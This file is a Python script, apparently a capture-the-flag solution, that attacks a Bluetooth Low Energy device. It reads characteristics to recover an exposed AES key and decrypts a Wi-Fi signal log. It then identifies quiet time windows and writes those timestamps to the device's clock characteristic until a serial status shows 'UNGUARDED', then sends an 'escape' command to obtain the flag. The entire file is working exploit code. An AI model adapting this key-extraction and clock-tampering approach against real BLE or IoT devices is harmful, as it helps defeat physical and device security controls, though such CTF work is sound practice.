import serial
import time
import struct
import re, csv, json, statistics
from datetime import datetime, timezone
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from bluepy.btle import Peripheral

MAC = "B8:D6:1A:4C:48:66"

ble = Peripheral(MAC)
print("[+] BLE connected")

# time.sleep(100)

print("[+] Checking UUIDs...")
# from discovery
ids = [
    "beb5483e-36e1-4688-b7f5-ea07361b26a8",
    "d0e12345-6789-4abc-def0-123456789abc",
    "cba1d466-344c-4be3-ab3f-189f80dd7518",
]

key = None
for uuid in ids:
    try:
        ch = ble.getCharacteristics(uuid=uuid)[0]
        data = json.loads(ch.read().decode(errors="replace"))
        print(uuid, "->", data)

        if data.get("aes_key_hex"):
            key = bytes.fromhex(data["aes_key_hex"])

    except Exception as e:
        print(uuid, "write failed:", e)


print("\n[+] Decrypting log_070...")
with open("log_070.enc", "rb") as f:
    blob = f.read()
iv, ct = blob[:16], blob[16:]
pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)
with open("log_070.csv", "wb") as f:
    f.write(pt)
print(pt[:120].decode(errors="replace"))


print("\n[+] Analyzing Wi-Fi subcarrier signal variance over time...")
prev = None
start = None
epochs = []
with open("log_070.csv", newline="") as f:
    r = csv.reader(f)
    next(r)  # skip header
    for ts, rssi, n, amps in r:
        ts = int(ts)
        var = statistics.pvariance(json.loads(amps))
        low = var < 1.0                      # quiet threshold
        if low and start is None:            # window opens
            start = ts
        if not low and start is not None:    # window closes
            a = datetime.fromtimestamp(start / 1000, timezone.utc)
            b = datetime.fromtimestamp(prev / 1000, timezone.utc)
            print(f"{a:%H:%M:%S} -> {b:%H:%M:%S}  ({(prev-start)/1000:.0f}s)\t epoch {start//1000}")
            epochs.append(start//1000)
            start = None
        prev = ts


print("\n[+] Setting new epoch to CLOCK_SET_CHAR...")
ch = ble.getCharacteristics(uuid=ids[2])[0]
s = serial.Serial("/dev/ttyUSB0", 115200, timeout=5)
for t in epochs:
    ch.write(struct.pack("<q", t), withResponse=True)
    time.sleep(1)
    s.write(b"status\r\n")

    data = s.read(99999).decode(errors="replace")
    print(data)

    state = re.search(r'"state":"(\w+)"', data)
    if state and state.group(1) == "UNGUARDED":
        s.write(b"escape\r\n")
        print("\n[+] FLAG RECEIVED:\n", s.read(99999).decode(errors="replace"))
        break

    time.sleep(10)
    print()

s.close()
ble.disconnect()
print("[+] BLE disconnected")
